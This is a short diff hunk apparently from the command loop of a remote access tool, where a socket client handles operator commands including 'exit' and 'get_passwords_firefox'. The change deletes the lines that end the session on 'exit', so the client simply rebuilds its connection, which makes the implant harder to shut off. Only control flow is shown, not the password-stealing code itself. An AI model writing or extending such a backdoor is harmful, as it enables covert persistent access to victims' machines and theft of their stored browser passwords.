@@ -643,9 +643,6 @@ User: {os.getlogin()}
                     self.errorsend()
 
             elif command == 'exit':
-                s.send(b"exit")
-                global connected
-                connected = False
                 sock.build_connection()
 
             elif command == 'get_passwords_firefox':
